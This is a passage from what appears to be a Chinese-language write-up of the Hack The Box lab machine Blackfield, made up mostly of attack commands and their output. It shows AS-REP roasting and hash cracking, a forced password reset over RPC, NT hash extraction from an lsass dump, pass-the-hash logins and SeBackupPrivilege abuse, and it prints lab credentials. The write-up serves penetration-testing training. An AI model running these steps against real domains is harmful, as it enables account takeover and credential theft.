+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>impacket-<span class="hljs-title class_">GetNPUsers</span> <span class="hljs-string">&#x27;BLACKFIELD.LOCAL/&#x27;</span>  -usersfile vali_user -format hashcat -outputfile hashes.asp -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span><br><br><span class="hljs-variable">$ </span>cat hashes.asp                    <br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$23</span><span class="hljs-variable">$support</span><span class="hljs-variable">@BLACKFIELD</span>.<span class="hljs-symbol">LOCAL:</span>a3ed233fba253c99c06ebaf99736a3bc<span class="hljs-variable">$e03c1b4d964a5d247b12222254efa9501b9d0be17bb089af9cd18bd7384c24619d153a0fd1d5f5981e3196c258c9a67c41a9a59ea0876bf8a3fd0e257c0c4147aa589fe5ef920f78e61f11b80dc61b87ba157aa01027433501dcd98e89c51b192fb2735adf5145cdcbbab27a0bb944acef1d0d5b2c0c782ddd8427843a6bf13f124ca8f68550eddddcb2686fdbbeb3c2d79b51f5f4991141242a79d2e7cb8157e833c8e04f401c0d2d927b40d334400e7ffcb63104c8ad735bfb4f5c1ca3ae1716bdf497ad15f52a1ba2d2776463711841493b0d5611bbc8906e1827bc32c38fa2e686bf38f695c7b0040583dcb1d7faf73a7e8a</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Crack-Hash"><a href="#Crack-Hash" class="headerlink" title="Crack Hash"></a>Crack Hash</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ hashcat -m <span class="hljs-number">18200</span> --force hashes.asp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><br>&lt;SNIP&gt;<br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$23</span><span class="hljs-variable">$support</span>@BLACKFIELD.LOCAL:a3ed233fba253c99c06ebaf99736a3bc<span class="hljs-variable">$e03c1b4d964a5d247b12222254efa9501b9d0be17bb089af9cd18bd7384c24619d153a0fd1d5f5981e3196c258c9a67c41a9a59ea0876bf8a3fd0e257c0c4147aa589fe5ef920f78e61f11b80dc61b87ba157aa01027433501dcd98e89c51b192fb2735adf5145cdcbbab27a0bb944acef1d0d5b2c0c782ddd8427843a6bf13f124ca8f68550eddddcb2686fdbbeb3c2d79b51f5f4991141242a79d2e7cb8157e833c8e04f401c0d2d927b40d334400e7ffcb63104c8ad735bfb4f5c1ca3ae1716bdf497ad15f52a1ba2d2776463711841493b0d5611bbc8906e1827bc32c38fa2e686bf38f695c7b0040583dcb1d7faf73a7e8a</span>:<span class="hljs-comment">#00^BlackKnight</span><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Access-Check"><a href="#Access-Check" class="headerlink" title="Access Check"></a>Access Check</h3><p>smb-&gt;access</p>
+<figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cal">$ crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span> -u support -p <span class="hljs-string">&#x27;#00^BlackKnight&#x27;</span><br><br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:BLACKFIELD.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-literal">False</span>)<br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">445</span>    DC01             [+] BLACKFIELD.<span class="hljs-keyword">local</span>\support:<span class="hljs-string">#00</span>^BlackKnight:<span class="hljs-string">#00</span>^BlackKnight<br></code></pre></td></tr></table></figure>
+
+<p>winrm-&gt;failed</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">$ crackmapexec winrm <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span> -u support -p <span class="hljs-string">&#x27;#00^BlackKnight&#x27;</span><br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">5985</span>   DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (<span class="hljs-keyword">name</span>:DC01) (domain:BLACKFIELD.<span class="hljs-keyword">local</span>)<br>HTTP        <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">5985</span>   DC01             [*] http:<span class="hljs-comment">//10.10.10.192:5985/wsman</span><br>WINRM       <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">5985</span>   DC01             [-] BLACKFIELD.<span class="hljs-keyword">local</span>\support:<span class="hljs-string">#00</span>^BlackKnight<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x04-support-gt-audit2020"><a href="#0x04-support-gt-audit2020" class="headerlink" title="0x04 support -&gt; audit2020"></a>0x04 support -&gt; audit2020</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span> -u support -p <span class="hljs-string">&#x27;#00^BlackKnight&#x27;</span>                                                                                                                                 <br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>:<span class="hljs-number">445</span>        <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>                                      <br>        Disk                                                    Permissions     <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">----                                                    -----------     -------</span><br>        <span class="hljs-keyword">ADMIN</span>$                                                  <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Remote <span class="hljs-keyword">Admin</span><br>        C$                                                      <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        forensic                                                <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Forensic / Audit <span class="hljs-keyword">share</span>.<br>        IPC$                                                    <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Remote IPC<br>        NETLOGON                                                <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>        profiles$                                               <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br>        SYSVOL                                                  <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span><br></code></pre></td></tr></table></figure>
+
+<p>遍历可进入的共享文件夹后，发现并没有什么可用信息。</p>
+<h3 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h3><p>于是尝试用bloodhound进行域内权限关系</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ python3 bloodhound<span class="hljs-selector-class">.py</span> -u support -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&#x27;#00^BlackKnight&#x27;</span> -c All -ns <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span> -d blackfield<span class="hljs-selector-class">.local</span> <span class="hljs-attr">--zip</span><br></code></pre></td></tr></table></figure>
+
+<p>将得到的zip包导入到Bloodhound中，然后找到了如下信息。</p>
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509230203124.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>这意味着，我们可以强制更改AUDIT2020账号的密码。</p>
+<h3 id="Password-Reset-Over-Rpc"><a href="#Password-Reset-Over-Rpc" class="headerlink" title="Password Reset Over Rpc"></a>Password Reset Over Rpc</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a></p>
+</blockquote>
+<p>我们可以用rpcclient登录，然后用<code>setuserinfo2</code>命令来更改账户密码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>rpcclient -U support <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>                                             <br><span class="hljs-title class_">Password</span> <span class="hljs-keyword">for</span> [<span class="hljs-title class_">WORKGROUP</span>\support]:<br>rpcclient <span class="hljs-variable">$&gt;</span> setuserinfo2 audit2020 <span class="hljs-number">23</span> <span class="hljs-string">&#x27;Password@!!&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Access-check"><a href="#Access-check" class="headerlink" title="Access check"></a>Access check</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span> -u audit2020 -p <span class="hljs-string">&#x27;Password@!!&#x27;</span>                            <span class="hljs-number">130</span> ⨯<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>    <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:DC01) (<span class="hljs-keyword">domain</span>:BLACKFIELD.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">False</span>)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>    <span class="hljs-number">445</span>    DC01             [+] BLACKFIELD.<span class="hljs-keyword">local</span>\audit2020:<span class="hljs-keyword">Password</span>@!!:<span class="hljs-keyword">Password</span>@!!<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ crackmapexec winrm <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span> -u audit2020 -p <span class="hljs-string">&#x27;Password@!!&#x27;</span>    <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>    <span class="hljs-number">5985</span>   DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:DC01) (<span class="hljs-keyword">domain</span>:BLACKFIELD.<span class="hljs-keyword">local</span>)<br>HTTP        <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>    <span class="hljs-number">5985</span>   DC01             [*] http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>:<span class="hljs-number">5985</span>/wsman<br>WINRM       <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>    <span class="hljs-number">5985</span>   DC01             [-] BLACKFIELD.<span class="hljs-keyword">local</span>\audit2020:<span class="hljs-keyword">Password</span>@!!<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x05-audit2020-gt-svc-backup"><a href="#0x05-audit2020-gt-svc-backup" class="headerlink" title="0x05 audit2020-&gt;svc_backup"></a>0x05 audit2020-&gt;svc_backup</h2><h3 id="Enumration"><a href="#Enumration" class="headerlink" title="Enumration"></a>Enumration</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span> -u audit2020 -p <span class="hljs-string">&#x27;Password@!!&#x27;</span>             <br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>:<span class="hljs-number">445</span>        <span class="hljs-type">Name</span>: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.192</span>                                      <br>        Disk                                                    Permissions     <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">----                                                    -----------     -------</span><br>        <span class="hljs-keyword">ADMIN</span>$                                                  <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Remote <span class="hljs-keyword">Admin</span><br>        C$                                                      <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        forensic                                                <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Forensic / Audit <span class="hljs-keyword">share</span>.<br>        IPC$                                                    <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Remote IPC<br>        NETLOGON                                                <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>        profiles$                                               <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span><br>        SYSVOL                                                  <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span><br></code></pre></td></tr></table></figure>
+
+<p>然后发现<code>forensic</code>共享文件夹中有内存转储信息，其中<code>lsass</code>的内存转储对我们进行进一步的横向移动有很大帮助。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ smbclient -U &#x27;audit2020%Password@!!&#x27; \\\\<span class="hljs-number">10.10.10.192</span>\\forensic<br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Sun Feb <span class="hljs-number">23 21:03:16</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Sun Feb <span class="hljs-number">23 21:03:16</span> <span class="hljs-number">2020</span><br>  commands_output                     D        <span class="hljs-number">0</span>  Mon Feb <span class="hljs-number">24 02:14:37</span> <span class="hljs-number">2020</span><br>  memory_analysis                     D        <span class="hljs-number">0</span>  Fri May <span class="hljs-number">29 04:28:33</span> <span class="hljs-number">2020</span><br>  tools                               D        <span class="hljs-number">0</span>  Sun Feb <span class="hljs-number">23 21:39:08</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">5102079</span> blocks of size <span class="hljs-number">4096</span>. <span class="hljs-number">1599037</span> blocks available<br>smb: \&gt; cd memory_analysis<br>smb: \memory_analysis\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri May <span class="hljs-number">29 04:28:33</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri May <span class="hljs-number">29 04:28:33</span> <span class="hljs-number">2020</span><br>  conhost.zip                         <span class="hljs-keyword">A</span> <span class="hljs-number">37876530</span>  Fri May <span class="hljs-number">29 04:25:36</span> <span class="hljs-number">2020</span><br>  ctfmon.zip                          <span class="hljs-keyword">A</span> <span class="hljs-number">24962333</span>  Fri May <span class="hljs-number">29 04:25:45</span> <span class="hljs-number">2020</span><br>  dfsrs.zip                           <span class="hljs-keyword">A</span> <span class="hljs-number">23993305</span>  Fri May <span class="hljs-number">29 04:25:54</span> <span class="hljs-number">2020</span><br>  dllhost.zip                         <span class="hljs-keyword">A</span> <span class="hljs-number">18366396</span>  Fri May <span class="hljs-number">29 04:26:04</span> <span class="hljs-number">2020</span><br>  ismserv.zip                         <span class="hljs-keyword">A</span>  <span class="hljs-number">8810157</span>  Fri May <span class="hljs-number">29 04:26:13</span> <span class="hljs-number">2020</span><br>  lsass.zip                           <span class="hljs-keyword">A</span> <span class="hljs-number">41936098</span>  Fri May <span class="hljs-number">29 04:25:08</span> <span class="hljs-number">2020</span><br>  mmc.zip                             <span class="hljs-keyword">A</span> <span class="hljs-number">64288607</span>  Fri May <span class="hljs-number">29 04:25:25</span> <span class="hljs-number">2020</span><br>  RuntimeBroker.zip                   <span class="hljs-keyword">A</span> <span class="hljs-number">13332174</span>  Fri May <span class="hljs-number">29 04:26:24</span> <span class="hljs-number">2020</span><br>  ServerManager.zip                   <span class="hljs-keyword">A</span> <span class="hljs-number">131983313</span>  Fri May <span class="hljs-number">29 04:26:49</span> <span class="hljs-number">2020</span><br>  sihost.zip                          <span class="hljs-keyword">A</span> <span class="hljs-number">33141744</span>  Fri May <span class="hljs-number">29 04:27:00</span> <span class="hljs-number">2020</span><br>  smartscreen.zip                     <span class="hljs-keyword">A</span> <span class="hljs-number">33756344</span>  Fri May <span class="hljs-number">29 04:27:11</span> <span class="hljs-number">2020</span><br>  svchost.zip                         <span class="hljs-keyword">A</span> <span class="hljs-number">14408833</span>  Fri May <span class="hljs-number">29 04:27:19</span> <span class="hljs-number">2020</span><br>  taskhostw.zip                       <span class="hljs-keyword">A</span> <span class="hljs-number">34631412</span>  Fri May <span class="hljs-number">29 04:27:30</span> <span class="hljs-number">2020</span><br>  winlogon.zip                        <span class="hljs-keyword">A</span> <span class="hljs-number">14255089</span>  Fri May <span class="hljs-number">29 04:27:38</span> <span class="hljs-number">2020</span><br>  wlms.zip                            <span class="hljs-keyword">A</span>  <span class="hljs-number">4067425</span>  Fri May <span class="hljs-number">29 04:27:44</span> <span class="hljs-number">2020</span><br>  WmiPrvSE.zip                        <span class="hljs-keyword">A</span> <span class="hljs-number">18303252</span>  Fri May <span class="hljs-number">29 04:27:53</span> <span class="hljs-number">2020</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Extract-Hashes"><a href="#Extract-Hashes" class="headerlink" title="Extract Hashes"></a>Extract Hashes</h3><p>解压<code>lsass.zip</code>后得到一个<code>lsass.dmp</code>的文件，然后利用<code>pypytakz</code>工具进行哈希转储。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> pypykatz lsa minidump lsass.DMP &gt; ../../lsadump <br><br><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> lsadump |grep username|<span class="hljs-built_in">sort</span> <span class="hljs-literal">-u</span><br>username <br>                username Administrator<br>username Administrator<br>                username DC01<span class="hljs-variable">$</span><br>username DC01<span class="hljs-variable">$</span><br>username DWM<span class="hljs-literal">-1</span><br>username DWM<span class="hljs-literal">-2</span><br>username LOCAL SERVICE<br>                username svc_backup<br>username svc_backup<br>username UMFD<span class="hljs-literal">-0</span><br>username UMFD<span class="hljs-literal">-1</span><br>username UMFD<span class="hljs-literal">-2</span><br></code></pre></td></tr></table></figure>
+
+<p>进行简要信息分析后，发现有几个账户的内容，比如<code>svc_backup</code>,<code>Administrator</code>。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs subunit">$ cat lsadump |grep svc_backup -C 5                                                                                                                                                       <br>FILE: ======== lsass.DMP =======               <br>== LogonSession ==                             <br>authentication_id 406458 (633ba)           <br>session_id 2                                <br>username svc_backup                     <br>domainname BLACKFIELD             <br>logon_server DC01                      <br>logon_time 2020<span class="hljs-string">-02</span><span class="hljs-string">-23</span>T18:00:03.423728<span class="hljs-string">+00</span>:00    <br>sid S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-4194615774</span><span class="hljs-string">-2175524697</span><span class="hljs-string">-3563712290</span><span class="hljs-string">-1413</span>                         <br>luid 406458                                                                           <br>        == MSV ==                       <br>                Username: svc_backup                                                           <br>                Domain: BLACKFIELD                                                          <br>                LM: NA                                                                        <br>                NT: 9658d1d1dcd9250115e2205d9f48400d                                                                   <br>                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c                                                              <br>                DPAPI: a03cd8e9d30171f3cfe8caad92fef621                                                                                   <br></code></pre></td></tr></table></figure>
+
+<p>获得了svc_backup账号的hash</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">svc_backup</span>:<span class="hljs-number">9658</span>d1d1dcd9250115e2205d9f48400d<br></code></pre></td></tr></table></figure>
+
+<p>验证凭证,发现可以用winrm登录</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$ crackmapexec winrm <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span> -u svc_backup -H &#x27;<span class="hljs-number">9658</span>d1d1dcd<span class="hljs-number">925011</span>5e<span class="hljs-number">2205</span>d9f<span class="hljs-number">4840</span>0d&#x27;<br>SMB         <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">5985</span>   DC01             [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (name:DC01) (domain:BLACKFIELD.local)<br>HTTP        <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">5985</span>   DC01             [*] http:<span class="hljs-comment">//10.10.10.192:5985/wsman</span><br>WINRM       <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span>    <span class="hljs-number">5985</span>   DC01             [+] BLACKFIELD.local\svc_backup:<span class="hljs-number">9658</span>d1d1dcd9250115e2205d9f48400d (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>evil-winrm</code>登录主机</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">evil-winrm -i <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span> -u $ evil-winrm -i <span class="hljs-number">10.10</span>.<span class="hljs-number">10.192</span> -u svc_backup -H &#x27;<span class="hljs-number">9658</span>d1d1dcd<span class="hljs-number">925011</span>5e<span class="hljs-number">2205</span>d9f<span class="hljs-number">4840</span>0d&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>flag在用户Desktop上</p>
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/userflag.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="0x06-svc-backup-gt-Administrator"><a href="#0x06-svc-backup-gt-Administrator" class="headerlink" title="0x06 svc_backup -&gt; Administrator"></a>0x06 svc_backup -&gt; Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>发现账户存在<code>SeBackupPrivilege</code>权限</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\svc_backup\Documents&gt; whoami /priv<br><br><span class="hljs-section">PRIVILEGES INFORMATION</span><br><span class="hljs-section">----------------------</span><br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeBackupPrivilege             Back up files and directories  Enabled<br>SeRestorePrivilege            Restore files and directories  Enabled<br>SeShutdownPrivilege           Shut down the system           Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled<br></code></pre></td></tr></table></figure>
+
+<p>这意味着我们可已利用这权限将一些没有权限访问读取的文件备份到一个可写目录下从而使得我们可以越权读取文件。</p>
+<p>先上传一些工具</p>
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509232448021.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\svc_backup\Desktop&gt;</span> <span class="hljs-keyword">import</span>-module .<span class="hljs-string">\SeBackupPrivilegeCmdLets.dll</span><br>*Evil-WinRM* PS C:<span class="hljs-string">\Users\svc_backup\Desktop&gt;</span> <span class="hljs-keyword">import</span>-module .<span class="hljs-string">\SeBackupPrivilegeUtils.dll</span><br></code></pre></td></tr></table></figure>
+
+<p>接着我们便可以尝试直接复制root.txt,但是很可惜，我们并不能复制该文件，同样也不能复制<code>ntds.dit</code>文件，因为后者正被另一个进程所使用。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">*Evil-WinRM* PS C:\programdata&gt; Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt so1.txt<br>Opening input file. - <span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied. (<span class="hljs-keyword">Exception</span> from HRESULT: <span class="hljs-number">0</span>x80070005 (E_ACCESSDENIED))<br><span class="hljs-keyword">At</span> line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span><br>+ Copy-FileSeBackupPrivilege \users\administrator\desktop\root.txt <span class="hljs-number">0</span>xdf ...<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (:) [Copy-FileSeBackupPrivilege], <span class="hljs-keyword">Exception</span><br>    + FullyQualifiedErrorId : <span class="hljs-type">System.Exception</span>,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\programdata&gt; <span class="hljs-keyword">Copy</span>-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .<br>Opening <span class="hljs-keyword">input</span> file. - The process cannot <span class="hljs-keyword">access</span> the file because it <span class="hljs-keyword">is</span> being used <span class="hljs-keyword">by</span> another process. (<span class="hljs-keyword">Exception</span> <span class="hljs-keyword">from</span> HRESULT: <span class="hljs-number">0x80070020</span>)<br>At <span class="hljs-type">line</span>:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ <span class="hljs-keyword">Copy</span>-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (:) [<span class="hljs-keyword">Copy</span>-FileSeBackupPrivilege], <span class="hljs-keyword">Exception</span><br>    + FullyQualifiedErrorId : <span class="hljs-keyword">System</span>.<span class="hljs-keyword">Exception</span>,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege<br></code></pre></td></tr></table></figure>
+
+<h3 id="Diskshadow"><a href="#Diskshadow" class="headerlink" title="Diskshadow"></a>Diskshadow</h3><blockquote>
